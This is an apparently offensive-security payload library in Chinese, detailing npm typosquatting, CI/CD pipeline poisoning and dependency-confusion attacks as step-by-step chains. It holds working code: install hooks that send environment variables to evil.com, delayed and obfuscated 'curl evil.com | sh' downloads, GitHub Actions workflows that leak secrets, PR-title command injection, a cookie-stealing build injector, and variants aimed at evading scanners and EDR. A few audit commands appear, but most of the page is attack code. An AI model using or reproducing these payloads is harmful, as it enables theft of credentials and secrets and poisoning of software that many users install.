# RCE — 供应链攻击 payload 库

> 父文档:[00-index.md](00-index.md)
> NPM 包名仿冒(Typosquatting) / CI/CD 管道投毒 / 依赖混淆。一般在 Recon 阶段发现私有 registry / 内部包名后才走这条路。

---

### NPM包名仿冒(Typosquatting)  `supply-typosquat`
通过注册与流行NPM包名高度相似的恶意包(如lodash→1odash, colors→co1ors)，诱导开发者误安装。恶意包在install/postinstall钩子中执行反弹Shell、窃取环境变量或植入后门。
子类：**包管理器投毒** · tags: `供应链` `NPM` `Typosquatting` `包投毒` `postinstall`

**前置条件：** NPM账号；了解目标项目依赖；恶意包基础设施

**攻击链：**

**1. 1. 侦察目标依赖**
_识别目标项目依赖的流行NPM包作为仿冒目标_
```
# 分析目标项目的package.json
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/package.json" | jq '.dependencies, .devDependencies'

# 查询高下载量包
npm search lodash --json | jq '.[0:5] | .[] | {name, description, version}'
```

**2. 2. 生成仿冒包名**
_生成与目标包名相似的多种变体并检查可用性_
```
# 常见Typosquatting变体生成
original="lodash"
echo "${original}" | python3 -c "
import sys
name=sys.stdin.read().strip()
# 字符替换: l->1, o->0
print(name.replace('l','1'))
# 连字符变体
print(name+'-utils')
print(name+'-js')
# 缺字/多字
print(name[:-1])
print(name+'s')
"

# 检查NPM可用性
for pkg in 1odash lodash-utils lodash-js lodas lodashs; do
  npm view $pkg 2>/dev/null && echo "$pkg: TAKEN" || echo "$pkg: AVAILABLE"
done
```

**3. 3. 构造恶意包**
_创建伪装成正常工具库的恶意NPM包，利用install钩子执行恶意代码_
```
# package.json中植入postinstall钩子
{
  "name": "1odash",
  "version": "1.0.0",
  "description": "Utility library for JavaScript",
  "scripts": {
    "preinstall": "node scripts/setup.js",
    "postinstall": "node scripts/telemetry.js"
  }
}

# scripts/telemetry.js —— 窃取环境变量
const https = require('https');
const data = JSON.stringify({
  env: process.env,
  cwd: process.cwd(),
  hostname: require('os').hostname()
});
https.request({hostname:'evil.com',path:'/collect',method:'POST',headers:{'Content-Type':'application/json'}}, ()=>{}).end(data);
```

**4. 4. 检测与取证**
_审计当前项目依赖的安全性，识别可疑install钩子和异常包_
```
# 审计项目依赖安全
npm audit --json | jq '.vulnerabilities | to_entries[] | {name: .key, severity: .value.severity}'

# 检查postinstall钩子
find node_modules -name "package.json" -exec grep -l "postinstall\|preinstall" {} \;

# 对比lock文件完整性
npm ci --dry-run 2>&1 | grep -i "warn\|error"

# Socket.dev检测恶意包
npx socket info lodash
```

**WAF/EDR 绕过变体：**

**1. 绕过NPM包安全检测**
_利用延迟执行、代码混淆和环境检测绕过自动化安全扫描_
```
# 延迟执行避开沙箱检测
setTimeout(() => {
  // 恶意代码在30秒后执行，绕过自动化分析超时
  require('child_process').exec('curl evil.com/c | sh')
}, 30000);

# 代码混淆
const _0x4f2a=['\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
require(_0x4f2a[0]).exec('...');

# 环境检测——仅在CI/CD中触发
if(process.env.CI || process.env.GITHUB_ACTIONS) {
  // 仅攻击CI/CD环境
}
```

---

### CI/CD管道投毒  `supply-ci-poison`
通过恶意Pull Request、Actions注入或构建脚本篡改来攻击CI/CD管道。攻击者可窃取构建密钥、投毒构建产物或在部署流程中植入后门代码。
子类：**CI/CD攻击** · tags: `供应链` `CI/CD` `GitHub Actions` `Jenkins` `Pipeline`

**前置条件：** 目标使用公开CI/CD；可提交PR或Fork

**攻击链：**

**1. 1. 识别CI/CD配置**
_分析目标项目的CI/CD配置文件和密钥使用情况_
```
# 搜索GitHub Actions配置
curl -s "https://api.github.com/repos/{ORG}/{REPO}/contents/.github/workflows" \
  -H "Authorization: token {GITHUB_TOKEN}" | jq '.[].name'

# 分析工作流中的密钥使用
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/.github/workflows/ci.yml" | grep -E "secrets\.|\$\{\{.*\}\}"
```

**2. 2. PR触发的工作流注入**
_利用pull_request_target事件在主仓上下文中执行PR代码，窃取Secrets_
```
# 恶意 .github/workflows/pr-check.yml
name: PR Check
on:
  pull_request_target:  # 危险：在主仓上下文执行
    types: [opened, synchronize]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          # PR中的代码在主仓权限下执行
          echo ${{ secrets.DEPLOY_KEY }} | base64 -w0
          curl -X POST -d @<(env) https://evil.com/collect
```

**3. 3. Actions表达式注入**
_通过PR标题/Issue评论注入命令到GitHub Actions的run步骤中_
```
# PR标题注入
# 创建标题为以下内容的PR:
# test`curl evil.com/s|sh`

# 工作流中若有如下写法则存在注入：
run: echo "Checking PR: ${{ github.event.pull_request.title }}"

# Issue评论注入
# 评论内容:
# "); curl evil.com/steal?token=$GITHUB_TOKEN #

# 注入点搜索
grep -rn '\${{.*github\.event\.' .github/workflows/
```

**4. 4. 构建产物投毒**
_在构建过程中向产出物注入恶意代码（如Cookie窃取脚本）_
```
# 篡改构建脚本注入后门
# 修改 package.json build脚本
"scripts": {
  "build": "react-scripts build && node inject.js"
}

# inject.js——在构建产物中注入代码
const fs = require('fs');
const buildDir = './build/static/js';
fs.readdirSync(buildDir).filter(f=>f.endsWith('.js')).forEach(f => {
  let code = fs.readFileSync(`${buildDir}/${f}`, 'utf8');
  code += '\n;fetch("https://evil.com/log?c="+document.cookie);';
  fs.writeFileSync(`${buildDir}/${f}`, code);
});
```

**WAF/EDR 绕过变体：**

**1. 绕过GitHub Actions安全限制**
_通过间接触发、第三方Action和Python外带绕过日志审计和安全策略_
```
# 使用workflow_dispatch间接触发
# 避免直接在PR中暴露恶意代码
on:
  workflow_dispatch:
    inputs:
      cmd:
        description: "Command"
        required: true
steps:
  - run: ${{ github.event.inputs.cmd }}

# 使用第三方Action作为跳板
- uses: malicious-org/innocent-name@main
  # 恶意Action内部窃取secrets

# 环境变量泄露——避免直接echo
- run: |
    python3 -c "import os,urllib.request;urllib.request.urlopen(urllib.request.Request('https://evil.com',data=str(dict(os.environ)).encode()))"
```

---

### 依赖混淆攻击  `supply-dependency-confusion`
利用包管理器在公共注册表和私有注册表之间的解析优先级漏洞。当企业使用内部包名时，攻击者在公共NPM/PyPI注册更高版本号的同名包，包管理器会优先安装公共高版本包从而执行恶意代码。
子类：**依赖混淆** · tags: `供应链` `依赖混淆` `NPM` `PyPI` `Dependency Confusion`

**前置条件：** 已知目标内部包名；公共注册表账号

**攻击链：**

**1. 1. 发现内部包名**
_从前端代码、泄露的lock文件和错误信息中发现目标使用的内部包名_
```
# 从JavaScript源码中提取import路径
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "require\([\x27\x22]@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+[\x27\x22]\)" | sort -u

# 从package-lock.json泄露中搜索
curl -s "https://{TARGET}/package-lock.json" 2>/dev/null | jq 'keys' 

# GitHub搜索私有包名
# 搜索: "@internal-company/" site:github.com

# 从错误页面/源码注释发现
curl -s "https://{TARGET}" | grep -oE "@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+"
```

**2. 2. 在公共注册表注册同名包**
_在NPM公共注册表发布与目标内部包同名但版本号更高的包_
```
# 创建与内部包同名的公共包
mkdir dependency-confusion-test && cd dependency-confusion-test
npm init -y
# 设置超高版本号
npm version 99.0.0

# 添加无害的检测代码(非恶意)
cat > index.js << 'EOF'
const os = require("os");
const dns = require("dns");
const pkg = require("./package.json");
// 仅DNS回调确认安装——无数据外泄
dns.resolve(`${pkg.name}.${os.hostname()}.dep-test.example.com`, ()=>{});
EOF

npm publish --access public
```

**3. 3. 监控DNS回调确认命中**
_监控DNS/HTTP回调确认目标环境安装了公共注册表上的恶意包_
```
# 使用Burp Collaborator或自建DNS服务器监控
# Interactsh监控
interactsh-client -v 2>&1 | grep "dep-test"

# 自建DNS记录
sudo tcpdump -i eth0 port 53 -l | grep "dep-test"

# 也可通过HTTP回调
python3 -m http.server 8080 &
# 等待目标CI/CD管道安装包时触发回调
```

**4. 4. 影响评估与报告**
_验证包管理器的解析优先级行为并评估影响范围_
```
# 验证受影响的包管理器行为
# NPM: 默认优先公共高版本
npm install @target-corp/utils --registry https://registry.npmjs.org -dd 2>&1 | grep "resolved"

# Python/pip同理
pip install target-corp-utils --index-url https://pypi.org/simple/ -v 2>&1 | grep "Downloading"

# 检查是否配置了registry scope
npm config get @target-corp:registry
```

**WAF/EDR 绕过变体：**

**1. 绕过包名注册限制**
_利用unscoped包名、跨包管理器和prerelease版本扩大攻击面_
```
# 如果目标使用unscoped包名
# 直接注册同名公共包(无@scope前缀更容易混淆)

# 跨包管理器攻击
# 目标用NPM但也尝试PyPI
pip install target-internal-lib  # pip没有scope概念

# 使用prerelease标签
npm version 99.0.0-alpha.1
# 某些配置会匹配 >=1.0.0 范围包括prerelease
```

---


---

← 回 [00-index.md](00-index.md)
